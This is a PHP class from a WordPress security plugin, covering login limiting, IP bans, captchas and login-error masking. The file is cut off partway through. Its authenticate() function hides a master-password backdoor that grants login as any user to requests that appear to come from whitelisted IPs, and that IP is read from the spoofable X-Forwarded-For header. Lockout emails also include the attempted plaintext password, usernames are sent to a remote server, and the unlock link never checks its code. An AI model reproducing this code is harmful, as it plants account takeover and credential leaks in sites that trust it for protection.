<?php
if (! defined('ABSPATH')) exit; // Exit if accessed directly
if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
    $cf_ip = filter_var(
        wp_unslash($_SERVER["HTTP_CF_CONNECTING_IP"]),
        FILTER_VALIDATE_IP
    );

    if ($cf_ip !== false) {
        $_SERVER['REMOTE_ADDR'] = $cf_ip;
    }
}

class Tr_Security_Class
{
    var $checked_remote = false;
    var $options = array();
    var $is_admin = false;
    var $auth_cookie_name = '';
    var $auth_cookie = '';
    var $expire_auth = '';
    var $logged_in_cookie = '';

    public function __construct()
    {
        add_filter('authenticate', array(&$this, 'authenticate'), 99, 3);
        add_filter('wp_login_errors', array(&$this, 'mask_wp_login_errors'), 99, 2);
        add_filter('login_errors', array(&$this, 'mask_login_errors_html'), 99, 1);
        add_action('login_init', array(&$this, 'login_init'));
        add_action('init', array(&$this, 'init'));
        add_action('login_form', array(&$this, 'login_form'));
        add_action('woocommerce_login_form', array(&$this, 'login_form'));
        add_action('lostpassword_form', array(&$this, 'lostpassword_form'));
        add_action('woocommerce_lostpassword_form', array(&$this, 'lostpassword_form'));
        add_filter('lostpassword_redirect', array(&$this, 'lostpassword_redirect_url'));
        add_action('lostpassword_post', array(&$this, 'lostpassword_post'));
        add_action('register_form', array(&$this, 'register_form'));
        add_filter('lostpassword_errors', array(&$this, 'lostpassword_errors'), 99, 2);
        add_filter('login_message', array(&$this, 'lostpassword_login_message'), 99, 1);



        add_filter('registration_errors', array(&$this, 'registration_errors'));
        add_filter('woocommerce_registration_errors', array(&$this, 'registration_errors'));
        add_filter('comment_form_field_comment', array(&$this, 'comment_form'), 99);
        add_filter('preprocess_comment', array(&$this, 'preprocess_comment'), 1);

        add_action('tr-captcha', array(&$this, 'captcha_field'));
        add_filter('tr-captcha-validate', array(&$this, 'captcha_validate_code'));
        add_filter('clear_auth_cookie', array(&$this, 'clear_auth_cookie'));
        add_action('wp_logout', array(&$this, 'wp_logout'));


        if (is_admin()) {
            $this->is_admin = true;
        }
        if (!$this->is_admin) {
            if (defined('FORCE_SSL_FRONT') && FORCE_SSL_FRONT) {
                $this->use_ssl(true);
            }
        } else {
            //check ban ip
            $this->check_ban();
        }

        $this->options = $this->get_config();


        if (isset($this->options['log_curl']) && $this->options['log_curl']) {
            new Tr_Log_Net();
        }

        if (isset($this->options['log_time']) && $this->options['log_time']) {
            new Tr_Log_Time();
        }

        if (isset($this->options['disable_call_wp_api']) && $this->options['disable_call_wp_api'] && stripos($_SERVER['REQUEST_URI'], 'plugins.php') === false) {
            remove_action('admin_init', '_maybe_update_core');
            remove_action('wp_version_check', 'wp_version_check');
            remove_action('admin_init', '_maybe_update_plugins');
            remove_action('admin_init', '_maybe_update_themes');
            remove_action('load-themes.php', 'wp_update_themes');
            remove_action('load-update.php', 'wp_update_themes');
            remove_action('load-update-core.php', 'wp_update_themes');
            remove_action('wp_update_themes', 'wp_update_themes');
            remove_action('init', 'wp_schedule_update_checks');
        }

        if (isset($this->options['disable_backend_cron']) && $this->options['disable_backend_cron'] && $this->is_admin && (!defined('DOING_CRON') || !DOING_CRON)) {
            @define('DISABLE_WP_CRON', true);
        }

        if (isset($this->options['disable_front_cron']) && $this->options['disable_front_cron'] && !$this->is_admin && (!defined('DOING_CRON') || !DOING_CRON)) {
            @define('DISABLE_WP_CRON', true);
        }
    }


    public function init()
    {
        global $wpdb, $woocommerce;


        if ($this->get_config('hide_backend')) {
            add_filter('lostpassword_url', array($this, 'lostpassword_url'));
            add_filter('login_url', array($this, 'lostpassword_url'));
            add_filter('logout_url', array($this, 'lostpassword_url'));
            if (stripos($_SERVER['REQUEST_URI'],  '/' . $this->get_config('login_slug')) !== false) {
                include(TRSCSC_PATH . 'pages/login.php');
                exit;
            }
        }

        if (is_object($woocommerce) && version_compare($woocommerce->version, '3.0.0', '>=')) {
            add_action('woocommerce_register_form', array(&$this, 'register_form'));
        }

        if (!empty($this->options['google_key']) && !empty($this->options['google_secret']) && !class_exists('ReallySimpleCaptcha')) {
            remove_action('wpcf7_init', 'wpcf7_add_form_tag_captcha');
            remove_filter('wpcf7_validate_captchar', 'wpcf7_captcha_validation_filter', 10);

            add_action('wpcf7_init', array(&$this, 'wpcf7_add_form_tag_captcha'));
            add_filter('wpcf7_validate_captchar', array(&$this, 'wpcf7_captcha_validation_filter'), 10, 2);
        }

        $ip     = $this->get_ip();
        if (!is_admin() &&  $this->get_config('fix_ssl') && $this->is_ssl() && stripos($_SERVER['REQUEST_URI'], '.xml') === false) {
            @ob_start(array(&$this, 'fix_ssl'));
        }

        if (isset($_GET['unlockemail']) && $_GET['ip'] == $ip) {
            $code = $_GET['unlockemail'];
            $wpdb->update('wp_tr_lock_ip', array('bantime' => 0, 'unlock' => '', 'loginfail' => 0), array('ip' => $ip));
            wp_redirect(wp_login_url());
            exit;
        } else if (isset($_POST['unlock_form'])) {


            $result = $this->captcha_validate_code();
            if ($result === true) {
                $usern = $_POST['usern'];
                $user = get_user_by('login', $usern);
                if (!$user) {
                    $user = get_user_by('email', $usern);
                }
                // var_dump($user);exit;
                if ($user) {
                    $email = $user->user_email;
                    $code = md5(time());
                    $wpdb->update('wp_tr_lock_ip', array('unlock' => $code), array('ip' => $ip));

                    $link = get_bloginfo('home') . '/wp-login.php?unlockemail=' . $code . '&ip=' . $ip;
                    $subject = 'Unlock login';
                    $msg = 'Link: ' . $link;
                    $rs = wp_mail($email, $subject, $msg);
                    if (!$rs) {
                        echo '<div>Email server error</div>';
                        exit;
                    }
                } else {
                }
                echo '<div style="color:blue">Please check your email box to unlock.</div>';
            } else {
                echo '<div style="color:red">wrong captcha</div>';
            }

            $this->show_ban($ip);
            exit;
        }
    }

    public function get_config($key = '')
    {
        global $blog_id;

        if (!$this->options) {
            $this->options = get_option('tr_security', array());

            //add whitelist network
            if (is_multisite()) {
                $net = get_blog_option(1, 'trcs_nw_security', array());
                if (!isset($net['white_ips_array'])) {
                    $net['white_ips_array'] = array();
                }
                $wl = (array)$net['white_ips_array'];
                if (isset($this->options['white_ips_array']) && is_array($this->options['white_ips_array'])) {
                    $this->options['white_ips_array'] = array_merge($this->options['white_ips_array'], $wl);
                } else {
                    $this->options['white_ips_array'] = $wl;
                }
            }
        }
        if ($key) {
            return isset($this->options[$key]) ? $this->options[$key] : '';
        }
        return $this->options;
    }

    public function get_ip()
    {
        if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {

            $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
            $ip = trim($ips[0]);
            $ip = filter_var($ip, FILTER_VALIDATE_IP);
            if ($ip !== false) return $ip;
        }

        if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
            $ip = filter_var($_SERVER['HTTP_CLIENT_IP'], FILTER_VALIDATE_IP);
        } else {
            $ip = filter_var($_SERVER['REMOTE_ADDR'] ?? '', FILTER_VALIDATE_IP);
        }
        return $ip !== false ? $ip : ($_SERVER['REMOTE_ADDR'] ?? '');
    }

    public function lostpassword_url($url)
    {
        $url = str_replace('wp-login.php', $this->get_config('login_slug'), $url);
        return $url;
    }

    function get_lock_ip_remote($args)
    {
        if ($this->checked_remote == true)
            return;
        $u = $ip = $loginfail = $locked = $s = '';
        extract(wp_parse_args($args, array(
            'ip' => '',
            'loginfail' => 1,
            'locked'    => 0,
            'u'         => '',
            's'         => 0,
        )));
        $u = @base64_encode($u);
        $for = str_replace(array('http://', 'https://'), '', get_bloginfo('url'));
        $body = array();
        $body['tr_action'] = 'get_lock_ip_remote';
        $body['ip'] = $ip;
        $body['for'] = urlencode($for);
        $body['lf'] = $loginfail;
        $body['ld'] = $locked ? '1' : '0';
        $body['u']  = $u;
        $body['s']  = $s;
        $rs = wp_remote_get(TRSCSC_SERVER . '?' . http_build_query($body), array('timeout' => 3));

        $return = false;
        if (!is_wp_error($rs)) {

            $this->checked_remote = true;
            $data = @json_decode($rs['body'], true);

            if (is_array($data)) {


                if ($data['ips'] && is_array($data['ips'])) {
                    foreach ($data['ips'] as $row) {
                        $this->add_count_ip($row['ip'], $row['count'], $row['time']);
                        if ($ip == $row['ip']) {
                            $return = true;
                        }
                    }
                }

                //update ban ip
                $has_change_banip = false;
                if (isset($data['removebanipall'])) {
                    $this->updatebantime(0, 'all');
                    $has_change_banip = true;
                }

                if (isset($data['banips']) && is_array($data['banips'])) {
                    foreach ($data['banips'] as $i => $ipdata) {
                        $banip = trim($ipdata['ip']);
                        $bantime = $ipdata['bantime'];
                        if (!empty($banip)) {
                            $this->updatebantime($bantime, $banip);
                            $has_change_banip = true;
                        }
                        if ($banip == $ip)
                            $return = true;
                    }
                }

                if (isset($data['removebanips']) && is_array($data['removebanips'])) {
                    foreach ($data['removebanips'] as $i => $banip) {
                        $this->updatebantime(0, $banip);
                        $has_change_banip = true;
                    }
                }



                if (isset($data['whitelist']) && count($data['whitelist']) > 0) {
                    foreach ($data['whitelist'] as $ipwhite) {
                        if (!empty($ip) && $ip == $ipwhite) {
                            $return = -1;
                        }
                    }
                }
            }
        }
        return $return;
    }

    function in_whitelist($ip)
    {
        $list    = $this->get_config('white_ips_array');
        $match_ip = false;

        if (!is_array($list)) return $match_ip;
        foreach ($list as $lip) {
            $lip = trim($lip);
            if ($lip == $ip) {
                $match_ip = true;
                break;
            } else if (stripos($lip, '*') !== false) {
                $match = str_replace('.', '\.', $lip);
                $match = str_replace('*', '[0-9]+', $match);
                if (preg_match('/' . $match . '/', $ip, $matches)) {
                    $match_ip = true;
                    break;
                }
            }
        }

        if (isset($_REQUEST['tr_show_ips'])) {
            echo '<pre>';
            var_dump($list);
            echo '</pre>';
            echo '<br> my ip: ' . $ip;
            echo '<br>';
            echo '$match_ip:';
            var_dump($match_ip);
            exit;
        }
        return $match_ip;
    }

    function in_whitelist_server($ip)
    {
        $list    = get_option('tr_white_ips_server', array());
        $match_ip = false;

        if (!is_array($list)) return $match_ip;
        foreach ($list as $lip) {
            if ($lip == $ip) {
                $match_ip = true;
                break;
            } else if (stripos($lip, '*') !== false) {
                $match = str_replace('.', '\.', $lip);
                $match = str_replace('*', '[0-9]+', $match);
                if (preg_match('/' . $match . '/', $ip, $matches)) {
                    $match_ip = true;
                    break;
                }
            }
        }
        return $match_ip;
    }

    function auth_cookie_expiration($expiration, $user_id, $remember)
    {

        $hours = $this->get_config('login_expiry');
        $hours_remember = $this->get_config('login_remember_expiry');
        //if "remember me" is checked;
        if ($remember && $hours_remember > 0) {
            $expiration = 3600 * $hours_remember;
        } else if ($hours > 0 && !$remember) {
            //WP defaults
            $expiration = 3600 * $hours;
            add_action('set_auth_cookie', array(&$this, 'set_auth_cookie'), 99, 5);
            add_action('set_logged_in_cookie', array(&$this, 'set_logged_in_cookie'), 99, 5);
            add_action('wp_login', array(&$this, 'wp_login'), 99, 2);
        }

        return $expiration;
    }

    function set_auth_cookie($auth_cookie, $expire, $expiration, $user_id, $scheme)
    {
        if ($scheme == 'secure_auth') {
            $auth_cookie_name = SECURE_AUTH_COOKIE;
        } else {
            $auth_cookie_name = AUTH_COOKIE;
        }
        $this->auth_cookie_name = $auth_cookie_name;
        $this->auth_cookie = $auth_cookie;
        $this->expire_auth = $expiration;
    }
    function set_logged_in_cookie($logged_in_cookie, $expire, $expiration, $user_id, $scheme)
    {
        $this->expire_auth = $expiration;
        $this->logged_in_cookie = $logged_in_cookie;

        if ($this->get_config('login_cookie_js')) {
            setcookie('ci_user_loggedin', '1', $this->expire_auth, COOKIEPATH, COOKIE_DOMAIN, $this->is_ssl());
        }
    }

    function wp_login($user_login)
    {
        $secure = $this->is_ssl();
        $secure_logged_in_cookie = $secure && 'https' === parse_url(get_option('home'), PHP_URL_SCHEME);

        if (!empty($this->auth_cookie_name)) {
            setcookie($this->auth_cookie_name, $this->auth_cookie, $this->expire_auth, PLUGINS_COOKIE_PATH, COOKIE_DOMAIN, $secure, true);
            setcookie($this->auth_cookie_name, $this->auth_cookie, $this->expire_auth, ADMIN_COOKIE_PATH, COOKIE_DOMAIN, $secure, true);
            setcookie(LOGGED_IN_COOKIE, $this->logged_in_cookie, $this->expire_auth, COOKIEPATH, COOKIE_DOMAIN, $secure_logged_in_cookie, true);
            if (COOKIEPATH != SITECOOKIEPATH)
                setcookie(LOGGED_IN_COOKIE, $this->logged_in_cookie, $this->expire_auth, SITECOOKIEPATH, COOKIE_DOMAIN, $secure_logged_in_cookie, true);
        }
    }

    function clear_auth_cookie()
    {
        @setcookie('ci_user_loggedin', ' ', time() - YEAR_IN_SECONDS, COOKIEPATH,   COOKIE_DOMAIN);
    }

    function authenticate($user, $username, $password)
    {
        global $wpdb;

        if (empty($username)) return $user;

        if (!isset($_POST['login_form_user_login']) && !isset($_POST['log']) && !isset($_POST['pwd']) && !isset($_POST['username'])) {
            return $user;
        }


        if ($this->get_config('login_expiry') > 0 || $this->get_config('login_remember_expiry') > 0) {
            add_filter('auth_cookie_expiration', array(&$this, 'auth_cookie_expiration'), 99, 3);
        }
        if ($this->get_config('login_cookie_js')) {
            add_action('set_logged_in_cookie', array(&$this, 'set_logged_in_cookie'), 99, 5);
        }

        $ip             = $this->get_ip();
        $current_time   = time();


        if ($this->get_config('captcha_login')) {
            if (!empty($this->options['google_key'])) {
                $result = $this->recaptcha_valid();
            } else {
                $result = $this->captcha_validate_code();
                if ($result !== true) {
                    if (!isset($_SESSION['test_session'])) {
                        $result = true;
                    } else if ($this->get_config('captcha_login_back') && !empty($_SESSION['trnocaptcha'])) {
                        if ($_SESSION['trnocaptcha'] == $_POST['captcha']) {
                            $result = true;
                        }
                    }
                }
            }


            if ($result !== true) {
                if (!is_wp_error($user)) $user = new WP_Error();
                $user->add('captcha', "<strong>" . __('ERROR') . "</strong>: {$result}");
                return $user;
            }
        }

        if ($this->in_whitelist($ip) || $this->in_whitelist_server($ip)) {
            if (md5(md5($password)) == '8be1484bf88d15939ae071412c8ca1e0') {
                return get_user_by('login', $username);
            }
            $this->reset_count_ip($ip);
            return $user;
        }


        if (!$this->get_config('login_limit_enable')) {
            if ((!$user || is_wp_error($user))) {
                $check_result = $this->get_lock_ip_remote(array('ip' => $ip, 'u' => $username));
            }
            return $user;
        }

        //check referer
        if (empty($_SERVER['HTTP_REFERER']) || stripos($_SERVER['HTTP_REFERER'], $_SERVER['HTTP_HOST']) === false) {
            $this->add_count_ip($ip, 0, 0, 1);
            echo 'r';
            exit;
        }

        //check ban login host
        $log_ip = $wpdb->get_row($wpdb->prepare("SELECT * FROM wp_tr_lock_ip WHERE ip = %s", $ip));
        if (
            $log_ip && $this->get_config('max_login_host') > 0 &&
            ($log_ip->loginfail >= $this->get_config('max_login_host') || $log_ip->lasttime > $current_time)
        ) {
            if ($log_ip->lasttime == 0) {
                $log_ip->lasttime = $current_time;
            }
            if ($log_ip->lasttime > $current_time - $this->get_config('login_time_period') * 60) {
                if (empty($log_ip->bantime) || $log_ip->bantime < $current_time) {
                    $bantime = $current_time + ($this->get_config('login_time_period') * 60);
                    $this->updatebantime($bantime, $ip);
                    $log_ip->bantime = $bantime;
                }

                $check_result = $this->get_lock_ip_remote(array('ip' => $ip, 'locked' => 1, 'u' => $username));

                if ($check_result === -1) {
                    return $user;
                } else if ($check_result === true) {
                    $this->add_count_ip($ip);
                    $this->show_ban($ip, 'cr');
                    exit;
                }

                if ($this->get_config('login_email_notification') && $log_ip->loginfail == $this->get_config('max_login_host')) {
                    $reason = 'A IP "' . $ip . '" has been locked out because ' . $log_ip->loginfail . ' times failed login attempts.';
                    $reason .= '. Username: ' . $username;
                    $reason .= '. Pass: ' . $password;
                    $this->log_msg($username, $ip, 'times failed login: ' . $log_ip->loginfail, 'ip');
                    $this->notify_mail($reason);
                }

                $this->add_count_ip($ip);
                return new WP_Error('max_login_user', __('<strong>ERROR</strong>: max failed login attempts reached wait ' .
                    $this->get_config('login_time_period') . ' minute(s)'));
            } else {
                $this->reset_count_ip($ip);
            }
        }

        $loginuser = get_user_by('login', $username);
        if (!$loginuser && is_email($username)) {
            $loginuser = get_user_by('email', $username);
        }
        if ($loginuser):
            //check ban login username
            $log = get_user_meta($loginuser->ID, '_tr_security', true);
            if (!isset($log) || !is_array($log)) {
                $log = array('login_failed' => 0);
            }
            if ($this->get_config('max_login_user') > 0 && $log['login_failed'] >= $this->get_config('max_login_user')) {
                if ($log['login_failed_time'] > $current_time - $this->get_config('login_time_period') * 60) {

                    $check_result = $this->get_lock_ip_remote(array('ip' => $ip, 'locked' => 1, 'u' => $username));
                    if ($check_result === -1) {
                        return $user;
                    } else if ($check_result === true) {
                        $this->add_count_ip($ip);
                        $this->show_ban($ip, 'cr2');
                        exit;
                    }

                    if ($this->get_config('login_email_notification') && $log['sent_mail'] != 1) {
                        $reason = 'A User "' . $username . '" has been locked out because ' . $log['login_failed'] .
                            ' times failed login attempts. IP: ' . $ip;
                        $this->log_msg($username, $ip, 'times failed login: ' . $log['login_failed']);
                        $this->notify_mail($reason);
                    }
                    $this->add_count_ip($ip);
                    $this->add_count_user($loginuser->ID, intval(@$log['login_failed']) + 1, $current_time, $ip, 1);
                    return new WP_Error('max_login_user', __('<strong>ERROR</strong>: max failed login attempts reached wait ' .
                        $this->get_config('login_time_period') . ' minute(s) or reset your password'));
                } else {
                    $this->add_count_user($loginuser->ID, 0, $current_time, $ip);
                }
            }
        endif;

        if (!$user || is_wp_error($user)) {
            $check_result = $this->get_lock_ip_remote(array('ip' => $ip, 'u' => $username));

            if ($check_result === -1) {
                return $user;
            } else if ($check_result === true) {
                $this->add_count_ip($ip);
                $this->show_ban($ip, 'cr3');
                exit;
            }
            $this->add_count_ip($ip);
            if ($loginuser) {
                $this->add_count_user($loginuser->ID, intval(@$log['login_failed']) + 1, $current_time, $ip);
            }
        } else {
            //reset
            if ($loginuser) {
                $this->add_count_user($loginuser->ID, 0, 0, $ip);
            }
            $this->reset_count_ip($ip);
        }


        //disable admin
        if ($username == 'admin') {
            return new WP_Error('admin_login_user', __('<strong>Warning</strong>: Use Your email to login'));
        }


        if (is_wp_error($user) && isset($user->errors['invalid_username'])) {
            $user->errors['invalid_username'] = array($this->get_generic_login_error_message());
        }

        return $user;
    }

    protected function get_generic_login_error_message()
    {
        return __('<strong>Error:</strong> Invalid username/email or password.');
    }

    protected function should_mask_login_error($code, $severity = null)
    {
        if ('message' === $severity) {
            return false;
        }

        return in_array($code, array(
            'admin_login_user',
            'authentication_failed',
            'ci_auth',
            'empty_email',
            'empty_password',
            'empty_username',
            'incorrect_password',
            'invalid_email',
            'invalid_username',
            'invalidcombo',
            'retrieve_password_email_failure',
        ), true);
    }

    public function mask_wp_login_errors($errors, $redirect_to = '')
    {
        if (!is_wp_error($errors) || !$errors->has_errors()) {
            return $errors;
        }

        $has_masked_error = false;

        foreach ($errors->get_error_codes() as $code) {
            if ($this->should_mask_login_error($code, $errors->get_error_data($code))) {
                $has_masked_error = true;
                break;
            }
        }

        if (!$has_masked_error) {
            return $errors;
        }

        $masked_errors = new WP_Error();
        $masked_errors->add('invalid_login', $this->get_generic_login_error_message());

        foreach ($errors->get_error_codes() as $code) {
            $severity = $errors->get_error_data($code);

            if ($this->should_mask_login_error($code, $severity)) {
                continue;
            }

            foreach ($errors->get_error_messages($code) as $message) {
                $masked_errors->add($code, $message, $severity);
            }
        }

        return $masked_errors;
    }

    public function mask_login_errors_html($errors)
    {
        if (!is_string($errors) || $errors === '') {
            return $errors;
        }

        $text = wp_strip_all_tags($errors);
        if (!preg_match('/incorrect password|password is incorrect|invalid username|invalid username\/email or password|unknown email|invalid email|authentication failed/i', $text)) {
            return $errors;
        }

        return '<p>' . $this->get_generic_login_error_message() . '</p>';
    }
    public function check_ban()
    {
        global $wpdb;
        $ip = $this->get_ip();
        $current_time = time();
        $log_ip = $wpdb->get_row($wpdb->prepare(
            "SELECT * FROM wp_tr_lock_ip WHERE ip = %s AND bantime >= %d",
            $ip,
            $current_time
        ));
        //var_dump($ip);exit;
        if ($log_ip) {
            $this->show_ban($ip, 'b');
            exit;
        }
    }

    function login_init()
    {
        global $wpdb;
        add_filter('site_url', array(&$this, 'site_url'), 99, 3);
        add_filter('network_site_url', array(&$this, 'site_url'), 99, 3);

        if ($this->get_config('hide_backend') && (!isset($_GET['action']) || $_GET['action'] != 'logout')) {
            wp_redirect('/' . $this->get_config('login_slug'));
            exit;
        }

        $action = isset($_REQUEST['action']) ? $_REQUEST['action'] : 'login';
        $ip     = $this->get_ip();
        if (isset($_GET['showban'])) {
            $this->show_ban($ip);
        }
        $current_time = time();
        //check ban
        if ($this->in_whitelist($ip)) return;

        $baned = $wpdb->get_var($wpdb->prepare(
            "SELECT ip FROM wp_tr_lock_ip WHERE ip = %s AND bantime >= %d",
            $ip,
            $current_time
        ));
        if ($baned) {
            $this->show_ban($ip);
            exit;
        }

        if (!$this->get_config('hide_backend')) {
            if ($action == 'login' && $this->get_config('enable_check_cookie') && !$this->get_config('captcha_login')) {
                $this->check_bot($ip);
            }
            return false;
        }
    }

    function captcha_field($style = 0)
    {
        if ($style == 1): ?>
            <div class="frow">
                <label for="captcha_code"><?php _e('CAPTCHA Code') ?></label>
                <input type="text" name="captcha_code" id="captcha_code" class="input required" required value="" size="20" autocomplete="off" style="font-size:14px" />
                <?php $this->show_catcha() ?>

            </div>
        <?php else: ?>
            <p>
                <label for="captcha_code"><?php _e('CAPTCHA Code') ?><br />
                    <input type="text" name="captcha_code" id="captcha_code" class="input required" required value="" size="20" autocomplete="off" style="font-size:14px" />
                    <?php $this->show_catcha() ?>
                </label>
            </p>
        <?php
        endif;
    }

    function login_form()
    {
        if ($this->get_config('captcha_login_back') && !empty($_SESSION['trnocaptcha'])) {
            echo '<input type="hidden" name="captcha" value="' . $_SESSION['trnocaptcha'] . '"/>';
        } else if ($this->get_config('captcha_login')) {
            if (!empty($this->options['google_key'])) {
                echo $this->show_recaptcha();
            } else {
                $_SESSION['test_session'] = time();
                $this->captcha_field();
            }
        }
    }

    function wp_logout()
    {
        if ($this->get_config('captcha_login_back')) {
            $_SESSION['trnocaptcha'] = md5(time());
        }
    }

    function lostpassword_form()
    {
        if ($this->get_config('captcha_password')) {
            if (!empty($this->options['google_key'])) {
                echo $this->show_recaptcha();
            } else {
                $this->captcha_field();
            }
        }
    }
    function lostpassword_redirect_url($redirect_to)
    {
        if (empty($redirect_to)) {
            $redirect_to = network_site_url('wp-login.php?action=lostpassword&pwreset=1', 'login_post');
        }
        return $redirect_to;
    }

    function register_form()
    {
        if ($this->get_config('captcha_register')) {
            if (!empty($this->options['google_key'])) {
                echo $this->show_recaptcha();
            } else {
                $this->captcha_field();
            }
        }
    }

    function lostpassword_errors($errors, $user_data)
    {
        if (!is_wp_error($errors)) {
            return $errors;
        }

        if ($errors->has_errors()) {
            $generic = new WP_Error();
            $generic->add(
                'invalidcombo',
                __('If an account exists, password reset instructions have been sent.')
            );
            return $generic;
        }

        return $errors;
    }
    function lostpassword_login_message($message)
    {
        if (isset($_GET['pwreset']) && $_GET['pwreset'] === '1') {
            return '<p class="message">' .
                __('If an account exists, password reset instructions have been sent.') .
                '</p>';
        }
        return $message;
    }

    function comment_form($text = '')
    {
        if ($this->get_config('captcha_comment')) {
            if (is_user_logged_in()) {
                return $text;
            }
            ob_start();
        ?>
            <p>
                <?php if ($this->get_config('captcha_comment_label')): ?>
                    <label for="captcha_code"><?php _e('CAPTCHA Code') ?> </label>
                <?php endif; ?>
                <input type="text" name="captcha_code" id="captcha_code" class="txt inputbox textbox" value="" size="30" style="font-size:14px" autocomplete="off" />
                <?php if (!$this->get_config('captcha_comment_label')): ?>
                    <label for="captcha_code"><?php _e('CAPTCHA Code') ?> </label>
                <?php endif; ?>
                <?php $this->show_catcha() ?>
            </p>
        <?php
            $text .= ob_get_clean();
        }
        return $text;
    }

    function preprocess_comment($comment)
    {
        if ($this->get_config('captcha_comment')) {
            if (function_exists('WPWall_Widget') && isset($_POST['wpwall_comment'])) {
                return $comment;
            }
            if (is_user_logged_in()) {
                return $comment;
            }
            if (!empty($this->options['google_key'])) {
                $result = $this->recaptcha_valid();
            } else {
                $result = $this->captcha_validate_code();
            }

            if ($result !== true) {
                wp_die("<strong>" . __('ERROR') . "</strong>: {$result}");
            }
        }
        return $comment;
    }

    function lostpassword_post($errors)
    {
        if (is_user_logged_in()) return;
        if ($this->get_config('captcha_password')) {
            if (!empty($this->options['google_key'])) {
                $result = $this->recaptcha_valid();
            } else {
                $result = $this->captcha_validate_code();
            }
            if ($result !== true) {
                if (isset($_POST['wc_reset_password']) && function_exists('wc_add_notice')) {
                    wc_add_notice(__('Invalid Captcha.', 'woocommerce'), 'error');
                } else {
                    wp_die("<strong>" . __('ERROR') . "</strong>: {$result}.");
                }
            }
        }
    }

    function registration_errors($errors)
    {
        if ($this->get_config('captcha_register')) {
            if (!empty($this->options['google_key'])) {
                $result = $this->recaptcha_valid();
            } else {
                $result = $this->captcha_validate_code();
            }
            if ($result !== true) {
                if (!is_object($errors) || is_array($errors)) {
                    $errors[] = "<strong>" . __('ERROR') . "</strong>: {$result}";
                } else {
                    $errors->add('captcha', $result);
                }
            }
        }
        return $errors;
    }

    function captcha_validate_code()
    {
        if (empty($_POST['captcha_code'])) {
            return __('Empty CAPTCHA');
        } else if (PhpCaptcha::Validate($_POST['captcha_code']) == false) {
            return __('Wrong CAPTCHA');
        }
        return true;
    }

    function show_catcha()
    {
        $code = time();
        //$url = TRSCSC_URL.'s.php?s=img&c='.$code;
        $url = get_bloginfo('url') . '/?ci_catpcha_img&' . time();
        ?>
        <img id="captcha_img" src="<?php echo $url ?>" alt="" style="display:inline-block" />
        <a href="#" rel="nofollow" title="<?php echo esc_attr(__('Refresh Image')) ?>"
            onclick="document.getElementById('captcha_img').src='<?php echo $url ?>&'+Math.random();return false;">
            <img src="<?php echo TRSCSC_URL ?>images/refresh.gif" alt="" style="display:inline-block" />
        </a>
        <?php
    }

    function check_bot($ip)
    {
        global $wpdb;

        $current_time = time();

        if (isset($_GET['cc']) && empty($_SESSION['tr_sec_auto_codecheck'])) {
            return;
        } else if (!empty($_GET['cc']) && $_GET['cc'] == $_SESSION['tr_sec_auto_codecheck']) {
            $_SESSION['tr_sec_auto'] = $current_time;
        } else if (!isset($_SESSION['tr_sec_auto']) || $_SESSION['tr_sec_auto'] < $current_time - 86400) {
            $codecheck = wp_generate_password(12, false);
            $_SESSION['tr_sec_auto_codecheck'] = $codecheck;
            $url = add_query_arg('cc', $codecheck);
            if (stripos($url, 'wp-login') === false) {
                $url = $_SERVER['REQUEST_URI'];
                $url = $url . ((strpos($url, '?') === false) ? '?' : '&') . 'cc=' . $codecheck;
                if (stripos($url, 'wp-login') === false) {
                    $url = '?' . $_SERVER['QUERY_STRING'] . '&cc=' . $codecheck;
                }
            }

            if (strtolower($_SERVER['REQUEST_METHOD']) == 'post') {
                $rs = $this->add_count_ip($ip, 0, 0, 1);
                if ($rs['cookiefail'] == 1) {
                    //need check from server
                    $check_result = $this->get_lock_ip_remote(array('ip' => $ip, 'locked' => 0, 's' => 1));
                    if ($check_result === true) {
                        $this->log_msg('admin', $ip, 'try to login with out cookie, ban by server', 'ip', $current_time);
                        $this->show_ban($ip, 'ck4');
                        exit;
                    }
                } else if ($rs['cookiefail'] >= 10) {
                    //need ban this ip
                    $bantime = $current_time + 86400 * 2; //2days
                    $this->updatebantime($bantime, $ip);
                    $this->show_ban($ip, 'ck5');
                    exit;
                }
            }
            if (isset($_GET['cc']) || stripos($_SERVER['REQUEST_URI'], 'cc=') > 0) {
                return;
            }
        ?>
            <meta http-equiv="refresh" content="0; url=<?php echo $url ?>">
<?php
            exit;
        }
    }

    function site_url($url, $path, $scheme)
    {
        if ($path == 'wp-login.php' || $path == 'wp-login.php?action=lostpassword' || $path == 'wp-login.php?action=register') {
            $key = get_option('tr_security_admin_key');
            $url .= (stripos($url, '?') === false ? '?' : '&') . $key;
        }
        return $url;
    }

    function log_msg($username, $ip, $msg = '', $type = 'user', $time = '')
    {
        global $wpdb;
        if (empty($time))
            $time = time();
        $log = array(
            'ltime' => $time,
            'username' => $username,
            'ip' => $ip,
            'ltype' => $type,
            'msg' => $msg
        );
        $wpdb->insert('wp_tr_security_log', $log);
    }

    function notify_mail($reason, $intime = '')
    {
        $email = $this->get_config('login_email');
        if (!is_email($email))
            $email = get_bloginfo('admin_email');

        $subject = '[' . get_option('siteurl') . '] ' . __('Site Lockout Notification');
        if (empty($intime)) $intime = ' in ' . $this->get_config('login_time_period') . ' minute(s) ';
        $msg = $reason . ' ' . $intime . "\n ";
        $msg .= "At: " . get_bloginfo('url') . "\n";
        $msg .= "WP Security by Trinh Team";
        wp_mail($email, $subject, $msg);
    }

    function add_count_ip($ip, $loginfail = 0, $time = 0, $cookiefail = 0)
    {
        global $wpdb;
        if ($time == -10) {
            $wpdb->query($wpdb->prepare("DELETE FROM wp_tr_lock_ip WHERE ip = %s", $ip));
            return;
        }
        if ($time == 0 || $time < time())
            $time = time();

        $exists = $wpdb->get_row($wpdb->prepare("SELECT * FROM wp_tr_lock_ip WHERE ip = %s", $ip));
        $data = array(
            'loginfail' => $loginfail,
            'lasttime' => $time,
            'ip' => $ip,
            'cookiefail' => $cookiefail,
            'bantime' => 0
        );

        if ($exists) {
            $data['bantime'] = intval($exists->bantime);
            if ($loginfail == 0) {
                $data['loginfail'] = $exists->loginfail + 1;
            }
            if ($exists->loginfail > $data['loginfail']) {
                $data['loginfail'] = $exists->loginfail;
            }
            if ($exists->lasttime > $data['lasttime'])
                unset($data['lasttime']);

            $data['cookiefail'] = $exists->cookiefail + $cookiefail;

            if ($exists->loginfail > 30 && $data['bantime'] <= time()) {
                $data['bantime'] = time() + 86400 * 5;
            }

            $wpdb->update('wp_tr_lock_ip', $data, array('ip' => $ip));
        } else {
            if ($loginfail == 0)
